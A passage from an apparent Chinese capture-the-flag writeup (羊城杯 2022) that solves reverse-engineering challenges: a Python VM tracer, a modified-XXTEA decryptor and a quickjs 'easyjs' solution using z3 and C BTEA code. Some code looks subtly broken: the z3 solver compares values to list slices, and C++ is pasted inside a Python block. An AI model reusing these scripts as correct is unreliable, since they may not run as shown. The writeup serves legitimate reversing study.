class="number">0x234</span>,<span class="number">0x345</span>,<span class="number">0x456</span>]</span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    v4 = r[<span class="number">16</span>]</span><br><span class="line">    r[<span class="number">16</span>] = v4+<span class="number">1</span></span><br><span class="line">    result = opcode[v4]-<span class="number">0xF1</span></span><br><span class="line">    <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">        v1 = r[<span class="number">16</span>]</span><br><span class="line">        v2 = opcode[v1]</span><br><span class="line">        v3 = opcode[v1+<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> v2==<span class="number">0xe0</span>:</span><br><span class="line">            r[<span class="number">16</span>] = v1+<span class="number">3</span></span><br><span class="line">            v4 = r[opcode[v1+<span class="number">2</span>]]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;r[<span class="subst">&#123;v3&#125;</span>] = r[<span class="subst">&#123;opcode[v1+<span class="number">2</span>]&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v4 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span>(v2&lt;&lt;<span class="number">24</span>):</span><br><span class="line">                r[<span class="number">16</span>] = v1+<span class="number">3</span></span><br><span class="line">                v2 -= <span class="number">1</span></span><br><span class="line">                v4 = opcode[v1+<span class="number">2</span>] | (v4&lt;&lt;<span class="number">8</span>)</span><br><span class="line">                v1 += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;r[<span class="subst">&#123;v3&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(v4)&#125;</span>&#x27;</span>)</span><br><span class="line">        r[v3] = v4</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">1</span>:</span><br><span class="line">        v1 = r[<span class="number">16</span>]</span><br><span class="line">        tmp = v1</span><br><span class="line">        v2 = opcode[v1]</span><br><span class="line">        v3 = opcode[v1+<span class="number">1</span>]</span><br><span class="line">        v4 = opcode[v1+<span class="number">2</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> r[v2] == r[v3]:</span><br><span class="line">            v5 = v1+<span class="number">3</span>+v4</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;jmp <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> v5==<span class="number">512</span>:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">hex</span>(mem[i]))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v5 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> v4:</span><br><span class="line">                r[<span class="number">16</span>] = v1+<span class="number">4</span></span><br><span class="line">                v4 -= <span class="number">1</span></span><br><span class="line">                v5 = opcode[v1+<span class="number">3</span>] | (v5&lt;&lt;<span class="number">8</span>)</span><br><span class="line">                v1 += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;if r[<span class="subst">&#123;v2&#125;</span>] != r[<span class="subst">&#123;v3&#125;</span>]: jmp <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">        r[<span class="number">16</span>] = v5</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">2</span>:</span><br><span class="line">        v1 = r[<span class="number">16</span>]</span><br><span class="line">        v2 = opcode[v1]</span><br><span class="line">        v3 = opcode[v1+<span class="number">1</span>]</span><br><span class="line">        v4 = r[v3]</span><br><span class="line">        v5 = v1+<span class="number">4</span>*v4</span><br><span class="line">        v6 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">4</span>,<span class="number">0</span>,<span class="number">1</span>):</span><br><span class="line">            r[<span class="number">16</span>] = v5+<span class="number">3</span></span><br><span class="line">            v6 = opcode[v5+<span class="number">2</span>] | v6&lt;&lt;<span class="number">8</span></span><br><span class="line">            v5 += <span class="number">1</span></span><br><span class="line">        <span class="comment"># v6 = opcode[v5+2]&lt;&lt;24 | opcode[v5+3]&lt;&lt;16 | opcode[v5+4]&lt;&lt;8 | opcode[v5+5]</span></span><br><span class="line">        r[<span class="number">16</span>] = v5 - <span class="number">4</span>*r[v3]+<span class="number">14</span></span><br><span class="line">        r[v2] = v6</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v2&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(v6)&#125;</span>   opcode[v1+4*r[opcode[v1+1]]+2]&lt;&lt;24 | opcode[v1+4*r[opcode[v1+1]]+3]&lt;&lt;16 | opcode[v1+4*r[opcode[v1+1]]+4]&lt;&lt;8 | opcode[v1+4*r[opcode[v1+1]]+5]&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">3</span>:</span><br><span class="line">        v2 = r[<span class="number">16</span>]</span><br><span class="line">        v3 = opcode[v2]</span><br><span class="line">        v4 = opcode[v2+<span class="number">1</span>]</span><br><span class="line">        v5 = r[v4]</span><br><span class="line">        r[<span class="number">16</span>] = v2+<span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> opcode[v2+<span class="number">2</span>]==<span class="number">0xe2</span>:</span><br><span class="line">            mem[v5] = r[v3]</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v2)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;mem[<span class="subst">&#123;v5&#125;</span>] = r[<span class="subst">&#123;v3&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r[v3] = mem[v5]</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v2)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v3&#125;</span>] = mem[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">13</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(r[<span class="number">16</span>])+<span class="string">&#x27;:\treturn&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">14</span>:</span><br><span class="line">        v1 = r[<span class="number">16</span>]</span><br><span class="line">        v3 = v1+<span class="number">2</span></span><br><span class="line">        v4 = opcode[v1]</span><br><span class="line">        v5 = opcode[v1+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> v4 == <span class="number">0xe0</span>:</span><br><span class="line">            v6 = v1+<span class="number">3</span></span><br><span class="line">            r[<span class="number">16</span>] = v1+<span class="number">3</span></span><br><span class="line">            v7 = r[opcode[v1+<span class="number">2</span>]]</span><br><span class="line">            s = <span class="string">f&#x27;r[<span class="subst">&#123;opcode[v1+<span class="number">2</span>]&#125;</span>]&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v7 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span>(v4&lt;&lt;<span class="number">24</span>):</span><br><span class="line">                r[<span class="number">16</span>] = v3+<span class="number">1</span></span><br><span class="line">                v4 -= <span class="number">1</span></span><br><span class="line">                v7 = opcode[v3] | (v7&lt;&lt;<span class="number">8</span>)</span><br><span class="line">                v3 += <span class="number">1</span></span><br><span class="line">            s = <span class="built_in">hex</span>(v7)</span><br><span class="line">            v6 = v3</span><br><span class="line">        r[<span class="number">16</span>] = v6+<span class="number">1</span></span><br><span class="line">        res = opcode[v6]-<span class="number">0xff</span>-<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> res == -<span class="number">11</span>:</span><br><span class="line">            r[v5] = (r[v5] +v7)&amp;<span class="number">0xffffffff</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] += &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">10</span>:</span><br><span class="line">            r[v5] = (r[v5] - v7) &amp;<span class="number">0xffffffff</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] -= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">9</span>:</span><br><span class="line">            r[v5] *= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] *= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">8</span>:</span><br><span class="line">            r[v5] //= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] //= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">7</span>:</span><br><span class="line">            r[v5] &lt;&lt;= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] &lt;&lt;= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">6</span>:</span><br><span class="line">            r[v5] &gt;&gt;= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] &gt;&gt;= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">5</span>:</span><br><span class="line">            r[v5] ^= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] ^= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">4</span>:</span><br><span class="line">            r[v5] |= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] |= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">3</span>:</span><br><span class="line">            r[v5] &amp;= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] &amp;= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">&#x27;wrong2&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(r[<span class="number">16</span>])+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">&#x27;wrong&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>（其中mem即为输入，手动代了几个数字方便调试）</p>
<p>按照流程，打印出7000+行代码，大致观察发现有明显的xxtea的特征，delta=0xf4f3f2f1，循环64轮，key=[0xf1f2f3f4,0xf5f6f7f8,0xf9fafbfc,0xfdfefff0]</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/25.png" alt="25"></p>
<p>解密无果，猜测有魔改，结果在开头和结尾又发现了一些加密。</p>
<p>开头将输入调换位置</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/26.png" alt="img"></p>
<p>结尾异或0xf8f7f6f5并调换位置</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/27.png" alt="img"></p>
<p>解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">0x55D37604</span>, <span class="number">0xB5FFA19E</span>, <span class="number">0xC202F734</span>, <span class="number">0x963BE91F</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    a[i] ^= <span class="number">0xf8f7f6f5</span></span><br><span class="line">t = a[<span class="number">3</span>]</span><br><span class="line">a[<span class="number">3</span>] = a[<span class="number">0</span>]</span><br><span class="line">a[<span class="number">0</span>] = t</span><br><span class="line">t = a[<span class="number">1</span>]</span><br><span class="line">a[<span class="number">1</span>] = a[<span class="number">2</span>]</span><br><span class="line">a[<span class="number">2</span>] = t</span><br><span class="line">a2 = [<span class="number">0xf1f2f3f4</span>,<span class="number">0xf5f6f7f8</span>,<span class="number">0xf9fafbfc</span>,<span class="number">0xfdfefff0</span>]</span><br><span class="line">v5 = <span class="number">0xf4f3f2f1</span></span><br><span class="line"><span class="comment"># n = 52//len(a) + 6</span></span><br><span class="line">v8 = v5*<span class="number">64</span></span><br><span class="line">v9 = a[<span class="built_in">len</span>(a)-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    j = <span class="built_in">len</span>(a)-<span class="number">2</span></span><br><span class="line">    v9 = a[j]</span><br><span class="line">    v6 = (v8&gt;&gt;<span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">    a[<span class="built_in">len</span>(a)-<span class="number">1</span>] = (a[<span class="built_in">len</span>(a)-<span class="number">1</span>] - (((v9 ^ a2[v6 ^ ((j+<span class="number">1</span>) &amp; <span class="number">3</span>)]) + (a[<span class="number">0</span>] ^ v8)) ^ (((<span class="number">16</span> * v9) ^ (a[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * a[<span class="number">0</span>]) ^ (v9 &gt;&gt; <span class="number">5</span>))))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">while</span>(j&gt;<span class="number">0</span>):</span><br><span class="line">        v9 = a[j-<span class="number">1</span>]</span><br><span class="line">        a[j] = (a[j] - (((v9 ^ a2[v6 ^ (j &amp; <span class="number">3</span>)]) + (a[j+<span class="number">1</span>] ^ v8)) ^ (((<span class="number">16</span> * v9) ^ (a[j+<span class="number">1</span>] &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * a[j+<span class="number">1</span>]) ^ (v9 &gt;&gt; <span class="number">5</span>))))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        j -= <span class="number">1</span></span><br><span class="line">    v9 = a[<span class="built_in">len</span>(a)-<span class="number">1</span>]</span><br><span class="line">    a[<span class="number">0</span>] = (a[<span class="number">0</span>] - (((v9 ^ a2[v6 ^ (j &amp; <span class="number">3</span>)]) + (a[j+<span class="number">1</span>] ^ v8)) ^ (((<span class="number">16</span> * v9) ^ (a[j+<span class="number">1</span>] &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * a[j+<span class="number">1</span>]) ^ (v9 &gt;&gt; <span class="number">5</span>))))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    v8 -= v5</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">3</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>]:                               <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]&gt;&gt;<span class="number">24</span>&amp;<span class="number">0xff</span>),<span class="built_in">chr</span>(a[i]&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xff</span>),<span class="built_in">chr</span>(a[i]&gt;&gt;<span class="number">8</span>&amp;<span class="number">0xff</span>),<span class="built_in">chr</span>(a[i]&amp;<span class="number">0xff</span>),end=<span class="string">&#x27;&#x27;</span>,sep=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># 1t_i5_3z_i5nt_it</span></span><br></pre></td></tr></table></figure>
<h3 id="easyjs"><a class="markdownIt-Anchor" href="#easyjs"></a> <strong>easyjs</strong></h3>
<p>quickjs,下载源码编译输出字节码，具体参考<a href="https://bbs.pediy.com/thread-259014.htm">https://bbs.pediy.com/thread-259014.htm</a></p>
<p>字节码中首先观察到了初始化一些常量函数以及字符串</p>
<p>可以很明显的看到一个大小写互换的base64表</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/28.png" alt="img"></p>
<p>得到字节码开始分析eval函数，这个相当于正常的main函数</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/29.png" alt="img"></p>
<p>这里的意思应该是encode64（enc1（））的意思，所以先调用enc1，然后再调用encode64</p>
<p>enc1里面就是一个BTEA delta mx key都很容易知道，上网上扒一个代码实现就行了</p>
<p>后面是一个错位异或，</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/30.png" alt="img"></p>
<p>最后调用了func5 func6函数 func5函数是一个转大整数的方法，</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/31.png" alt="img"></p>
<p>func6里面主要是一堆的逻辑运算，然后与已知量比较，</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/32.png" alt="32"></p>
<p>将data3 15个数字分为三组，然后进行比较，拿z3解一下</p>
<p>总结一下就是先逆出来逻辑运算、然后是异或、base64、BTEA写脚本解就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">data3 = [<span class="number">5911837666743816200</span>,</span><br><span class="line"><span class="number">5133585975960501272</span>,</span><br><span class="line"><span class="number">9082418069800623372</span>,</span><br><span class="line"><span class="number">9154480062992383756</span>,</span><br><span class="line"><span class="number">6848599583376686600</span>,</span><br><span class="line"><span class="number">147787617043219975</span>,</span><br><span class="line"><span class="number">6140429622497212985</span>,</span><br><span class="line"><span class="number">2526269866358605591</span>,</span><br><span class="line"><span class="number">4552892036882908959</span>,</span><br><span class="line"><span class="number">4543304157965338119</span>,</span><br><span class="line"><span class="number">4620825451554930944</span>,</span><br><span class="line"><span class="number">8808899373961281307</span>,</span><br><span class="line"><span class="number">5924901230665995531</span>,</span><br><span class="line"><span class="number">8808899373961281307</span>,</span><br><span class="line"><span class="number">8662527953563041043</span>]</span><br><span class="line"></span><br><span class="line">data4 = [<span class="number">2101524238053948931</span>,</span><br><span class="line"><span class="number">9154814254531429383</span>,</span><br><span class="line"><span class="number">8941618984500083987</span>]</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    data5 = [BitVec(<span class="string">&quot;x%d&quot;</span> % i, <span class="number">64</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    x = data5[<span class="number">0</span>]</span><br><span class="line">    y = data5[<span class="number">1</span>]</span><br><span class="line">    z = data5[<span class="number">2</span>]</span><br><span class="line">    w = data5[<span class="number">3</span>]</span><br><span class="line">    a = ~x &amp; z</span><br><span class="line">    b = (z &amp; ~x | (x&amp;y) | (z &amp; (~y)) | (x &amp; (~y)) ) ^ w</span><br><span class="line">    c = (z &amp; ~y &amp; x)| (z &amp; ((x &amp; y) | (y &amp; (~x)) | ~(y | x)))</span><br><span class="line">    d = (z &amp; ~x) | (x &amp; y) | (z &amp; ~y) | (x &amp; ~y)</span><br><span class="line">    e = (z &amp; ~x) | (x&amp;y) | (y&amp;z)</span><br><span class="line">    s = Solver()</span><br><span class="line">    s.add(a == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(b == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(c == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(d == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(e == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(y == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.check()</span><br><span class="line">    m = s.model()</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data5:</span><br><span class="line">        res.append(<span class="built_in">int</span>(<span class="built_in">str</span>(m[i])))</span><br><span class="line">    <span class="comment">#print(res)</span></span><br><span class="line">    </span><br><span class="line">    aa = []</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">        k = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            k.append(r &amp; <span class="number">0xff</span>)</span><br><span class="line">            r &gt;&gt;= <span class="number">8</span></span><br><span class="line">        aa += k</span><br><span class="line">    data += aa</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(data)</span><br><span class="line"></span><br><span class="line">data[-<span class="number">1</span>] = data[-<span class="number">1</span>]^data[<span class="number">1</span>]</span><br><span class="line">data[-<span class="number">2</span>] = data[-<span class="number">2</span>]^data[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">3</span>, -<span class="number">1</span>)[::-<span class="number">1</span>]:</span><br><span class="line">    data[i] ^= data[i+<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(data))</span><br><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"> </span><br><span class="line">using namespace std;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#define DELTA 289739796</span></span><br><span class="line"><span class="comment">#define MX (((z &gt;&gt; 6) ^ (y &lt;&lt; 3)) + ((y &gt;&gt; 4) ^ (z &lt;&lt; 5)) ^ ((sum^y) + (secret[(p&amp;3)^e] ^ z)))  </span></span><br><span class="line"> </span><br><span class="line">  void btea(uint32_t *vector, <span class="built_in">int</span> n, uint32_t const secret[<span class="number">4</span>]) &#123;</span><br><span class="line">    uint32_t y, z, <span class="built_in">sum</span>;</span><br><span class="line">    unsigned p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;          </span><br><span class="line">      rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">      <span class="built_in">sum</span> = <span class="number">0</span>;</span><br><span class="line">      z = vector[n-<span class="number">1</span>];</span><br><span class="line">      do &#123;</span><br><span class="line">        <span class="built_in">sum</span> += DELTA;</span><br><span class="line">        e = (<span class="built_in">sum</span> &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n-<span class="number">1</span>; p++) &#123;</span><br><span class="line">          y = vector[p+<span class="number">1</span>];</span><br><span class="line">          z = vector[p] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        y = vector[<span class="number">0</span>];</span><br><span class="line">        z = vector[n-<span class="number">1</span>] += MX;</span><br><span class="line">      &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; -<span class="number">1</span>) &#123;  </span><br><span class="line">      n = -n;</span><br><span class="line">      rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">      <span class="built_in">sum</span> = rounds*DELTA;</span><br><span class="line">      y = vector[<span class="number">0</span>];</span><br><span class="line">      do &#123;</span><br><span class="line">        e = (<span class="built_in">sum</span> &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p=n-<span class="number">1</span>; p&gt;<span class="number">0</span>; p--) &#123;</span><br><span class="line">          z = vector[p-<span class="number">1</span>];</span><br><span class="line">          y = vector[p] -= MX;</span><br><span class="line">        &#125;</span><br><span class="line">        z = vector[n-<span class="number">1</span>];</span><br><span class="line">        y = vector[<span class="number">0</span>] -= MX;</span><br><span class="line">      &#125; <span class="keyword">while</span> ((<span class="built_in">sum</span> -= DELTA) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    char secret[<span class="number">17</span>] = <span class="string">&quot;welcometoycb2022&quot;</span>;</span><br><span class="line">    uint8_t buf[] = &#123;<span class="number">50</span>, <span class="number">145</span>, <span class="number">242</span>, <span class="number">166</span>, <span class="number">198</span>, <span class="number">128</span>, <span class="number">32</span>, <span class="number">9</span>, <span class="number">222</span>, <span class="number">204</span>, <span class="number">87</span>, <span class="number">158</span>, <span class="number">160</span>, <span class="number">147</span>, <span class="number">155</span>, <span class="number">82</span>, <span class="number">71</span>, <span class="number">9</span>, <span class="number">38</span>, <span class="number">246</span>, <span class="number">0</span>, <span class="number">88</span>, <span class="number">185</span>, <span class="number">225</span>, <span class="number">62</span>, <span class="number">226</span>, <span class="number">31</span>, <span class="number">171</span>, <span class="number">199</span>, <span class="number">245</span>, <span class="number">106</span>, <span class="number">31</span>&#125;;</span><br><span class="line">    btea((uint32_t*)buf,-<span class="number">8</span>,(uint32_t*)secret);</span><br><span class="line">    <span class="keyword">for</span>(<span class="built_in">int</span> j=<span class="number">0</span>;j&lt;<span class="number">32</span>;j++)</span><br><span class="line">        printf(<span class="string">&quot;%c&quot;</span>,buf[j]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Web</tag>
        <tag>Misc</tag>
        <tag>Pwn</tag>
        <tag>Reverse</tag>
        <tag>Writeup</tag>
      </tags>
  </entry>
</search>
